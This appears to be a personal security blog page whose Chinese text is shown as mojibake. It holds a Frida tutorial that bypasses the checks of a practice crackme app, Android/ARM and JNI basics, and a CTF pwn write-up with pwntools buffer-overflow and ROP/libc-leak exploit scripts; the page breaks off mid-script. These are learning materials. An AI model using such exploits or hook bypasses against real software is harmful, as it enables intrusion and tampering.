<p>å­¦å®‰å“hookå…¥é—¨çš„æ—¶å€™çº ç»“äºé€‰ç”¨å“ªä¸ªå¹³å°,Xposedå’Œfridaçœ‹äº†çœ‹,éƒ½åœ¨è„‘å­é‡Œäº‘äº†ä¸€ä¸‹è§‰å¾—éƒ½å¥½å¥½ç”¨,äºæ˜¯å¹²è„†å’Œæ•™ç¨‹åç€æ¥,çœ‹ç€å¸ˆå‚…<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-850885-1-1.html">Xposed</a>çš„æ–‡ç« åç”¨fridaå¤ç°ä¸€é(å®æˆ˜é“¾æ¥ä¹Ÿåœ¨æ–‡ç« ä¸­,å°±ä¸å‘å‡ºæ¥äº†),è€Œä¸”ä¹‹å‰<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4839">Peanuts</a>å¸ˆå‚…ä¹Ÿå‘è¿‡Xposedçš„äº†.</p>
<p>å…¶å®ä¸¤è€…å·®åˆ«è¿˜æ˜¯æ¯”è¾ƒå¤§çš„,å°±æ‹¿å·¥ä½œæ–¹å¼æ¥è¯´,Xposedèµ°çš„æ˜¯å¼€å‘é‚£ä¸€å¥—,,é‡æ–°å†™ç»„ä»¶åå†æ‰“åŒ…ç”¨,å¯ä»¥è¯´æ˜¯ä¸€åŠ³æ°¸é€¸,ä»¥åç›´æ¥æ‹¿apkå°±èƒ½ç”¨;fridaåˆ™ä¸ç„¶,å®ƒçš„æ–¹å¼æ˜¯æŠŠjsä»£ç æ³¨å…¥åˆ°è¿›ç¨‹çš„æ–¹å¼,ç®€å•ä½†æ˜¯ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾å°±æ˜¯ä¸å¥½ç”¨åˆ°å®é™…appçš„ä½¿ç”¨ä¸­</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="æœ¬æœºå®éªŒç¯å¢ƒ"><a href="#æœ¬æœºå®éªŒç¯å¢ƒ" class="headerlink" title="æœ¬æœºå®éªŒç¯å¢ƒ"></a>æœ¬æœºå®éªŒç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3.7</span><br><span class="line">å¤œç¥æ¨¡æ‹Ÿå™¨Android5.1.1</span><br><span class="line">Windows10</span><br></pre></td></tr></table></figure>

<h3 id="frida-å®‰è£…"><a href="#frida-å®‰è£…" class="headerlink" title="frida å®‰è£…"></a>frida å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure>

<h3 id="frida-server-å®‰è£…è¿è¡Œ"><a href="#frida-server-å®‰è£…è¿è¡Œ" class="headerlink" title="frida-server å®‰è£…è¿è¡Œ"></a>frida-server å®‰è£…è¿è¡Œ</h3><p>å…ˆçœ‹çœ‹è‡ªå·±æ¨¡æ‹Ÿå™¨å¹³å°,ä¸€èˆ¬æ¨¡æ‹Ÿå™¨æ¶æ„éƒ½æ˜¯x86çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Î» adb shell getprop ro.product.cpu.abi</span><br><span class="line">x86</span><br></pre></td></tr></table></figure>

<p>æˆ‘è¿™è¾¹æ˜¯x86çš„,åˆ°<a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">frida-releases</a>è¿™æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬è¿›è¡Œä¸‹è½½,ä¹‹åç”¨adbæŠŠå®ƒpushåˆ°æ‰‹æœºä¸­,è½¬å‘åˆ°æœ¬æœºç«¯å£,èµ·frida-server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb shell /data/local/tmp/frida-server</span><br></pre></td></tr></table></figure>
<p>å·²ç»èµ·æ¥äº†,å¯ä»¥ç”¨<code>frida-ps -U</code>çœ‹çœ‹æ¨¡æ‹Ÿå™¨è¿›ç¨‹</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822205451-ab0d3e44-e476-1.png"></p>
<h2 id="hookå®æˆ˜æµ‹è¯•"><a href="#hookå®æˆ˜æµ‹è¯•" class="headerlink" title="hookå®æˆ˜æµ‹è¯•"></a>hookå®æˆ˜æµ‹è¯•</h2><blockquote>
<p>å®æˆ˜é“¾æ¥åœ¨æœ€ä¸Šæ–¹</p>
</blockquote>
<p>å°±ç›´æ¥æ‹¿å¸ˆå‚…çš„ç¨‹åºæäº†,å¸ˆå‚…ç”¨å†™xposedç»„ä»¶çš„æ–¹å¼å†™çš„,æˆ‘å°±æ‹¿fridaå¤ç°ä¸€é,åŒæ—¶å®ç°å‡ ä¸ªåˆ«çš„æ€è·¯,å¼€å§‹å§</p>
<h3 id="è§£é”ç "><a href="#è§£é”ç " class="headerlink" title="è§£é”ç "></a>è§£é”ç </h3><p>å…ˆè£…åˆ°æ‰‹æœºä¸Šæµ‹è¯•,å‘ç°è¿›å»åè¦ä¸€ä¸ªkeyè¿›è¡Œè§£é”.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822205636-e9c1e644-e476-1.png"></p>
<p>ä½¿ç”¨åç¼–è¯‘å·¥å…·(æˆ‘ç”¨çš„jadx)æ‰“å¼€apk,å‘ç°æœ‰ä¸¤ä¸ªå°æµ‹éªŒ,ç¬¬ä¸€å¤„æ˜¯è¦ä¸€ä¸ªè§£é”ç ,è§£é”ç ä¸ç¨‹åºç®—å‡ºæ¥çš„å®Œå…¨ä¸€è‡´å°±è·³åˆ°ä¸‹ä¸€ä¸ªæŒ‘æˆ˜.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822205855-3c7a6884-e477-1.png"></p>
<p>è¿›å…¥åŠ å¯†å‡½æ•°ä¸€æ¢ç©¶ç«Ÿ,å¯ä»¥çœ‹åˆ°è¿›è¡Œäº†åŠ å¯†.</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822211451-76506a52-e479-1.png"></p>
<p>ä¹‹åç¨‹åºä½¿ç”¨equalså‡½æ•°åˆ¤æ–­å’Œæˆ‘ä»¬è¾“å…¥çš„æ˜¯å¦ç›¸ç­‰(åœ¨æ­¤ä¹‹å‰ç¨‹åºæœ‰ä¸€å¤„è¾“å‡ºè§£é”ç çš„å‡½æ•°,å³a.a,ä¸è¿‡å› ä¸ºæ¡ä»¶ä¸æ»¡è¶³æœªæ‰§è¡Œ).</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210006-66d01156-e477-1.png"></p>
<p>äº†è§£æµç¨‹åè¿›è¡Œæ‰“hookç»•è¿‡,æ€è·¯æœ‰ä¸¤ç§,ä¸€ç§æ˜¯æŠŠçœŸå®çš„è§£é”ç æ‰“å°å‡ºæ¥(è¿™æ€è·¯ç­‰ä¸‹ç”¨ä¸¤ç§æ–¹å¼å®ç°,åˆ†åˆ«æ˜¯hookæ‰æ‰“å°å‡½æ•°a.aå’Œç³»ç»Ÿå‡½æ•°equalsçš„æ–¹å¼),è¿˜æœ‰å·é¸¡çš„æ–¹å¼å°±æ˜¯ç›´æ¥ä¿®æ”¹åŠ å¯†å‡½æ•°returnä¸€ä¸ªæˆ‘ä»¬æ§åˆ¶çš„å€¼,ä¹‹ååœ¨è¾“å…¥çš„æ—¶å€™ç›´æ¥è¾“æˆ‘ä»¬çš„å€¼å°±å¥½äº†.</p>
<p>åœ¨æ³¨å…¥jsä»£ç çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹å¼,åˆ†åˆ«æ˜¯jsç›´æ¥åŠ è½½å’Œä½¿ç”¨pythonçš„æ–¹å¼,pythonå½“ä½œä¸€ä¸ªloaderçš„è§’è‰²æŠŠjsä»£ç æ³¨å…¥è¿›å»,pythonä»£ç åœ¨æœ€ä¸‹ä¾§,æœ¬ç¯‡ç”¨çš„æ˜¯pythonçš„æ–¹å¼.ä¸‹é¢æ˜¯jsä»£ç (è¿™ä»£ç ä¸ç”¨çº ç»“,å’Œpwntoolsä¸€æ ·ç”¨å¤šäº†å°±ç†Ÿç»ƒäº†):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Script loaded successfully &quot;);</span><br><span class="line">Java.perform(function x() &#123;</span><br><span class="line">	var String = Java.use(&#x27;java.lang.String&#x27;)//å®šä½åˆ°è¦hookçš„ç±»å</span><br><span class="line">	String.equals.implementation = function (arg1) &#123;//equalså°±æ˜¯æˆ‘ä»¬è¦hookçš„å‡½æ•°</span><br><span class="line">	console.log(&quot;your input : &quot; + this.toString());</span><br><span class="line">	console.log(&quot;I&#x27;m the real key : &quot; + arg1);//æ‰“å°å‡ºæ¥çœŸå®çš„è§£é”ç </span><br><span class="line">	var ret = this.equals(arg1);</span><br><span class="line">	return ret;//è¿”å›å€¼</span><br><span class="line">	&#125;</span><br><span class="line">	var Show_key = Java.use(&quot;com.hfdcxy.android.by.a.a&quot;);</span><br><span class="line">	Show_key.a.overload(&quot;java.lang.String&quot;).implementation = function (args1) &#123;</span><br><span class="line">	console.log(&quot;Your_key_is&quot; + args1);//æ‰“å°è§£é”ç </span><br><span class="line">    &#125;</span><br><span class="line">	var my_class = Java.use(&quot;com.hfdcxy.android.by.test.a&quot;);</span><br><span class="line">    my_class.a.implementation = function () &#123;</span><br><span class="line">		return &quot;123456789&quot;;//ä½¿ç”¨&quot;123456789&quot;å½“è¿”å›å€¼</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>ä¸‰ç§æ–¹æ³•éƒ½èƒ½å®Œæˆæ­¥éª¤ä¸€çš„hook,ä½¿ç”¨pythonæ³¨å…¥ä¸€ä¸‹çœ‹çœ‹æ•ˆæœ</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210438-08b38142-e478-1.png"><br>çœ‹åˆ°äº†è¾“å…¥çš„123å’ŒçœŸæ­£çš„ä½œæ¯”è¾ƒ<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210459-15444680-e478-1.png"><br>æˆåŠŸäº†,è¿›å…¥ä¸‹ä¸€ä¸ªç•Œé¢.æœ¬è´¨ä¸Šæ˜¯ä¸¤ç§æ–¹æ³•,ä¸€ç§æ˜¯hookè‡ªå®ç°å‡½æ•°,ä¸€ç§å°±æ˜¯hookç³»ç»Ÿå‡½æ•°</p>
<h3 id="ç‚¹é‡‘å¸-å¼€å®ç®±"><a href="#ç‚¹é‡‘å¸-å¼€å®ç®±" class="headerlink" title="ç‚¹é‡‘å¸,å¼€å®ç®±"></a>ç‚¹é‡‘å¸,å¼€å®ç®±</h3><p>ç‚¹é‡‘å¸çš„è¿™ä¸ªonclickæ‰§è¡Œçš„å‡½æ•°å¾ˆç®€å•,å°±æ˜¯ç‚¹å‡»ä¸€æ¬¡åcoinåŠ i(åŸæœ¬ç¨‹åºiç­‰äº1)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210749-7b096e96-e478-1.png"></p>
<p>å¼€å®ç®±æŒ‰é’®å°±æ˜¯åˆ¤æ–­ä½ çš„coinå€¼å¤§å°,å¤§äºç­‰äº9999å°±å®ŒæˆæŒ‘æˆ˜</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210815-8a227328-e478-1.png"></p>
<p>è¿™é‡Œå†ä»‹ç»å¦ä¸€ç§å§¿åŠ¿,å°±æ˜¯ä¿®æ”¹å‡½æ•°çš„å‚æ•°å®Œæˆå‚æ•°è°ƒç”¨,fridaå®ç°èµ·æ¥ä¹Ÿå¾ˆç®€å•,è§js:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Script loaded successfully &quot;);</span><br><span class="line">Java.perform(function x() &#123;</span><br><span class="line">	var coin = Java.use(&quot;com.hfdcxy.android.by.test.b&quot;);</span><br><span class="line">	coin.a.overload(&quot;android.content.SharedPreferences&quot;, &quot;android.widget.TextView&quot;, &quot;int&quot;).implementation = function (args1,args2,args3) &#123;//overloadåæ¥çš„å‚æ•°éƒ½æ˜¯è¿™ä¸ªaå‡½æ•°çš„å‚æ•°</span><br><span class="line">		return this.a(args1,args2,9999)//æŠŠå‚æ•°æ”¹æˆ9999,è¿™æ ·ä¸€æ¬¡å°±èƒ½åŠ 9999ä¸ªäº†</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822211046-e4519eaa-e478-1.png"><br>ç‚¹äº†å‡ æ¬¡coinå°±å¾ˆå¤§äº†,ç›´æ¥æ»¡è¶³æ¡ä»¶<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822211143-061094b0-e479-1.png"></p>
<h2 id="æ€»ç»“-python-loader"><a href="#æ€»ç»“-python-loader" class="headerlink" title="æ€»ç»“ &amp; python loader"></a>æ€»ç»“ &amp; python loader</h2><p>å¯ä»¥çœ‹åˆ°fridaåœ¨hookæ—¶çœŸçš„æ–¹ä¾¿,ä»£ç ä¹Ÿä¸éš¾,æœ¬ç¯‡jså¤ªè¿‡ç®€å•,æœ‰å¥½å¤šå¾ˆnbçš„æ¨¡æ¿éƒ½å¯ä»¥æ‹¿æ¥ç»ƒç»ƒå¹¶æµ‹è¯•,<a target="_blank" rel="noopener" href="https://frida.re/docs/javascript-api/">å®˜æ–¹æ–‡æ¡£</a>ä¹Ÿæ˜¯æ·±å…¥å­¦ä¹ çš„å¥½å»å¤„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import frida</span><br><span class="line">device = frida.get_remote_device()</span><br><span class="line">pid = device.spawn([&quot;com.ss.android.ugc.aweme&quot;])#ç¨‹åºå</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(1) </span><br><span class="line">session = device.attach(pid)</span><br><span class="line">with open(&quot;s1.js&quot;) as f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line">input()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/02/2020-09-02-frida_hook/" data-id="cuidsQ6r3A8GMHwNybr8mn2TH" data-title="Introduction to Frida" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-08-10-android" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/10/2020-08-10-android/" class="article-date">
  <time class="dt-published" datetime="2020-08-09T16:00:00.000Z" itemprop="datePublished">2020-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/10/2020-08-10-android/">Some Android Basics</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Environment-construction"><a href="#Environment-construction" class="headerlink" title="Environment construction"></a>Environment construction</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#ç¼–è¯‘ç¯å¢ƒ</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">#æ„‰å¿«ç¼–è¯‘</span><br><span class="line">arm-linux-gnueabi-gcc test.c -o test</span><br><span class="line"></span><br><span class="line">#è¿è¡Œç¯å¢ƒ</span><br><span class="line">sudo apt install qemu qemu-kvm qemu-system-arm</span><br><span class="line"></span><br><span class="line">#æ„‰å¿«ä½¿ç”¨qemuè·‘èµ·æ¥</span><br><span class="line">qemu-arm ./test</span><br><span class="line"></span><br><span class="line">#root@ubuntu:~/Desktop# qemu-arm test</span><br><span class="line">#/lib/ld-linux.so.3: No such file or directory</span><br><span class="line">#å‡ºç°è¿™ç§é—®é¢˜è·‘ä¸€ä¸‹</span><br><span class="line">sudo cp  /usr/arm-linux-gnueabi/lib/ld-linux.so.3 /lib</span><br><span class="line">sudo cp /usr/arm-linux-gnueabi/lib/libgcc_s.so.1 /lib</span><br><span class="line">sudo cp /usr/arm-linux-gnueabi/lib/libc.so.6 /lib</span><br><span class="line"></span><br><span class="line">#è°ƒè¯•ç¯å¢ƒ</span><br><span class="line">sudo apt install gdb-arm-none-eabi </span><br><span class="line"></span><br><span class="line">#å¼€å¯remoteè°ƒè¯•</span><br><span class="line">qemu-arm -g 1234 test</span><br><span class="line"></span><br><span class="line">(gdb) target remote localhost:1234</span><br><span class="line">Remote debugging using localhost:1234</span><br><span class="line">warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration</span><br><span class="line">of GDB.  Attempting to continue with the default armv5t settings.</span><br><span class="line"></span><br><span class="line">0xf67ceb00 in ?? ()</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x844c</span><br><span class="line">(gdb) r</span><br><span class="line">The &quot;remote&quot; target does not support &quot;run&quot;.  Try &quot;help target&quot; or &quot;continue&quot;.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000844c in main ()</span><br><span class="line">(gdb) dis</span><br><span class="line">disable      disassemble  disconnect   display      </span><br><span class="line">(gdb) disassemble </span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008444 &lt;+0&gt;:	push	&#123;r11, lr&#125;</span><br><span class="line">   0x00008448 &lt;+4&gt;:	add	r11, sp, #4</span><br><span class="line">=&gt; 0x0000844c &lt;+8&gt;:	ldr	r0, [pc, #12]	; 0x8460 &lt;main+28&gt;</span><br><span class="line">   0x00008450 &lt;+12&gt;:	bl	0x82e0 &lt;printf@plt&gt;</span><br><span class="line">   0x00008454 &lt;+16&gt;:	mov	r3, #0</span><br><span class="line">   0x00008458 &lt;+20&gt;:	mov	r0, r3</span><br><span class="line">   0x0000845c &lt;+24&gt;:	pop	&#123;r11, pc&#125;</span><br><span class="line">   0x00008460 &lt;+28&gt;:	ldrdeq	r8, [r0], -r8	; &lt;UNPREDICTABLE&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<h2 id="A-small-example-of-jni"><a href="#A-small-example-of-jni" class="headerlink" title="A small example of jni"></a>A small example of jni</h2><p>é¦–å…ˆå°±æ˜¯javaæ–‡ä»¶(ç”¨äºè°ƒç”¨)å’Œcæ–‡ä»¶(ç”¨äºè¢«è°ƒç”¨)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public  class NativeDemo &#123;</span><br><span class="line">	&#123;</span><br><span class="line">		System.load(&quot;C:\\Users\\14555\\Desktop\\test\\sayHello.dll&quot;);//dllæ–‡ä»¶ç»å¯¹è·¯å¾„</span><br><span class="line">	&#125;</span><br><span class="line">	public native void sayHello();</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		new NativeDemo().sayHello();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#include &quot;NativeDemo.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_NativeDemo_sayHello(JNIEnv *, jobject)&#123;</span><br><span class="line">	using namespace std;</span><br><span class="line">	printf(&quot;hello!jniworld&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­NativeDemo.hæ˜¯æ ¹æ®<code>javac -h -jni NativeDemo.java</code>è‡ªåŠ¨ç”Ÿæˆï¼Œä½†è¿™å¾—æ³¨æ„æŠŠç”Ÿæˆçš„<code>#include &lt;jni.h&gt;</code>æ”¹æˆ<code>#include &quot;jni.h&quot;</code>ç„¶åæŠŠéœ€è¦çš„æ–‡ä»¶æ‹·åˆ°å½“å‰ç›®å½•ï¼ˆæœ€ç®€å•çš„æ–¹å¼ï¼‰</p>
<p>dllæ–‡ä»¶ç”Ÿæˆå°±æ˜¯è¿™æ ·ï¼Œæ¯”è¾ƒç®€å•<br><code>g++ -m64 -shared hello.cpp -o sayHello.dll</code></p>
<p>ä¹‹åå°±æ˜¯javaæ–‡ä»¶ç¼–è¯‘è¿è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\14555\Desktop\test</span><br><span class="line">Î» javac NativeDemo.java</span><br><span class="line"></span><br><span class="line">C:\Users\14555\Desktop\test</span><br><span class="line">Î» java NativeDemo</span><br><span class="line">hello!jniworld</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/08/10/2020-08-10-android/" data-id="cuid2SGDTiDwabN1afeXafhaG" data-title="Some Android Basics" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-07-31-buuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/31/2020-07-31-buuctf/" class="article-date">
  <time class="dt-published" datetime="2020-07-30T16:00:00.000Z" itemprop="datePublished">2020-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/31/2020-07-31-buuctf/">pwn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å¯’å‡åˆ·çš„buuctfä¸Šçš„pwné¢˜ï¼Œå†è¿‡å‡ éåŸºç¡€ï¼Œä»¥åæƒ³ç©äº†è¿˜ä¼šåˆ·ï¼ŒæŒç»­æ›´æ–°ã€‚å› ä¸ºé¢˜å¤ªå¤šè‡ªå·±åˆä¸æ˜¯èµ›æ£åªèƒ½æ¡ç€åˆ·ï¼Œå¸ˆå‚…ä»¬æœ‰æƒ³è®¨è®ºçš„æˆ–æ±‚æ›´æ–°çš„å¯ä»¥å‘é‚®ä»¶ï¼Œæˆ‘å°½åŠ›è€Œä¸º~~~</p>
<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc è¿ä¸Š <code>cat flag</code> å³å¯</p>
<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./warmup_csaw_2016&#39;)
context.log_level = &#39;debug&#39;
#p=remote(&#39;node3.buuoj.cn&#39;,29987)
payload = &#39;a&#39;*72+p64(0x40060D)
sleep(0.1)
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./pwn1_sctf_2016&#39;)
context.log_level = &#39;debug&#39;
#p=remote(&#39;node3.buuoj.cn&#39;,29987)
payload = &#39;IIIIIIIIIIIIIIIIIIII1234&#39;+p64(0x8048F13)
sleep(0.1)
p.sendline(payload)
p.interactive()
</code></pre>
<p>è‡ªå·±é€†å‘å¤ªèœäº†,è¯•å‡ºæ¥çš„~~~</p>
<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./ciscn_2019_n_1&#39;)
context.log_level = &#39;debug&#39;
payload = &#39;a&#39;*56+p64(0x4006BE)
p.sendline(payload)
p.interactive()
</code></pre>
<p>ä¹Ÿå¯ä»¥è¦†ç›– v2 å€¼</p>
<pre><code>from pwn import *
p = process(&#39;./ciscn_2019_n_1&#39;)
payload=&#39;a&#39;*0x2c+p64(0x41348000)
p.sendline(payload)
p.interactive()
</code></pre>
<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./pwn_patched&#39;)
libc=ELF(&#39;./libc-2.23.so&#39;)
elf = ELF(&#39;./pwn_patched&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,26443)
payload = &#39;\x00&#39;+&#39;\xff&#39;*(0x20-2)
p.sendline(payload)
p.recvuntil(&#39;Correct\n&#39;)
got = elf.got[&quot;puts&quot;]
plt = elf.plt[&#39;puts&#39;]
payload = p32(plt)+p32(0x8048916)+p32(got)+p32(0x080487F6)+p32(235+12)
p.sendline(&#39;a&#39;*(235-4)+p32(0x804a050+0xe7)+payload)
real = u32(p.recvuntil(&#39;\x0a&#39;)[:-1])
libc_base = real - libc.symbols[&quot;puts&quot;]
one = 0x3a819 + libc_base
print hex(one)
p.send(&#39;a&#39;*235+p32(one)+p32(0))
p.interactive()
</code></pre>
<p>å°±æ˜¯ä¸€ä¸ªå¸¸è§„çš„æ ˆè¿ç§».æƒ³æ³•æœ‰ç‚¹éº»çƒ¦,ä¸­é—´ç©¿æ’ç”¨äº†å‡ ä¸ªå¾ˆèœçš„æŠ€å·§,ä½† exp è¿˜å¯ä»¥</p>
<p>è¿™é‡Œè®°å½•ä¸€ä¸‹,é¦–å…ˆ <code>\x123</code> ä¾‹å¦‚è¿™ç§,ç³»ç»Ÿåªä¼šä¿ç•™åä¸¤ä¸ªè¾¾åˆ°ä¸€ä¸ªå­—èŠ‚</p>
<h2 id="ciscn-2019-c-1-ciscn-2019-en-2"><a href="#ciscn-2019-c-1-ciscn-2019-en-2" class="headerlink" title="ciscn_2019_c_1 &amp; ciscn_2019_en_2"></a>ciscn_2019_c_1 &amp; ciscn_2019_en_2</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p = process(&#39;./real&#39;)
elf = ELF(&#39;./real&#39;)
libc=elf.libc
